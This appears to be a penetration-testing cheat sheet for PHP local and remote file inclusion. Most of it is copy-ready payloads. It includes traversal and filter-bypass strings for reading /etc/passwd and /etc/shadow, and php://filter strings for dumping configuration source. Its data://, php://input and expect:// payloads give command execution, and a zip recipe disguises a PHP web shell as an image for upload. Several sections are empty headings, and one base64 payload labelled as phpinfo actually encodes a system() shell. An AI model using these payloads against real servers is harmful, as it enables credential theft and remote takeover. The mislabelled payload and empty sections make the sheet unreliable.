# X - Local & Remote File Inclusion [LFI/RFI]

The File Inclusion vulnerability allows for the include of a file locally
present on the server or remotely hosted on a webserver, usually exploiting a
"dynamic file inclusion" mechanisms implemented in the target application.  

This issue is caused when an application builds a path to executable code using
an attacker-controlled variable in a way that allows the attacker to control
which file is executed at run time. The vulnerability occurs due to the use of
user-supplied input without proper validation.

A file include vulnerability is distinct from a generic Directory Traversal
Attack, in that directory traversal is a way of gaining unauthorized file
system access, and a file inclusion vulnerability subverts how an application
loads code for execution.

### File Inclusion vulnerability detection

In black box testing, look for scripts which take filenames as parameters,
such as the following examples:

```
http://vulnerable_host/preview.php?file=example.html
http://vulnerable_host/?op=home
```

Try to access freely accessible files, such as:

```
# Linux
/etc/passwd

# Windows
WINDOWS\System32\drivers\etc\hosts
```

### File access

###### Basic

Typical proof-of-concept for basic LFI would be:

```
# Linux
?file=../../../../../../../../../../etc/passwd

# Windows
?file=..\..\..\..\..\..\..\..\..\..\WINDOWS\System32\drivers\etc\hosts
```

###### Files of interest

The following Linux files can be of interest:

```
# System information
/etc/issue

# System users account information
/etc/passwd

# System users account hashed password
/etc/shadow

# System grouops information
/etc/group
```

###### Null Byte

In some cases, the server will will include ".php‚Äù at the end of the requested
file.
Such mechanisms can be bypassed using the line terminator char *null byte*:

```
# Linux
?file=../../../../../../../../../../etc/passwd%00

# Windows
?file=..\..\..\..\..\..\..\..\..\..\WINDOWS\System32\drivers\etc\hosts%00
```

###### Double encoding

Encoding parameters twice in hexadecimal format can be leveraged to bypass
security controls such as blacklist filters.  
For example, the '.' (*dot*) character represent %2E in hexadecimal
representation. When the % symbol is encoded again, its representation in
hexadecimal code is %25. The result from the double encoding process is %252E.

```
# Linux
?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Windows
?file=%252e%252e%255c%252e%252e%255c%252e%252e%255cWINDOWS%255cSystem32%255cdrivers%255cetc%255chosts
```

###### Filter bypass
Some blacklist filter may be implemented and restrict the usage of "../".  
Those kind of filter may be passed using the following payloads:

```
# Linux
?file=..././..././..././etc/passwd
?file=....//....//etc/passwd
?file=..///////..////..//////etc/passwd

# Windows
?file=....\\....\\....\\....\\....\\....\\WINDOWS\System32\drivers\etc\hosts%00
?file=..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\WINDOWS\System32\drivers\etc\hosts%00
```

###### PHP wrappers

**php://filter**  
This PHP wrapper can be used to access the source code of the page:

```
# Base64 encoding
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=config.php%00

# rot13 encoding
?page=php://filter/read=string.rot13/resource=config.php
?page=php://filter/read=string.rot13/resource=config.php%00
```

### RCE

###### Remote Inclusion

###### File upload

###### PHP wrappers

**data**  
The PHP *data://* wrapper allows for the injection and execution of PHP code
given in parameter:

```
# <?php phpinfo(); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B

# <?php system($_GET['cmd']); ?>
?page=data://text/plain;base64,PD8gcGhwIHN5c3RlbSgkX0dFVFsnY21kJ10pOyA%2fPg%3d%3d

# XSS (alert(1))
?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

**expect**  
The PHP *expect://* wrapper allows execution of system commands but is not
enabled by default.

```
php?page=expect://whoami
```

**input**  
The PHP *input://* wrapper allows for the injection and execution of PHP code
given in the POST request body:

```
POST .../?page=php://input&cmd=whoami
...
<?php system($_GET['cmd']); ?>
```

**zip / phar**  
The *zip://* and *phar://* wrappers can be used to achive code execution if a
zip or phar archive can be upload to the server:

```
# <pre><?php system($_GET['cmd']); ?></pre>
echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
# As the file extension does not matter, a file with a jpg extension can be uploaded
mv payload.zip shell.jpg;    

# zip://<PATH_TO_UPLOADED_FILE>%23<FILE_INSIDE_ZIP>&cmd=<CMD>
?page=zip://shell.jpg%23payload&cmd=whoami
?page=zip://shell.jpg%23payload.php
```

###### Log files contamination

###### PHP sessions

###### /proc/self/
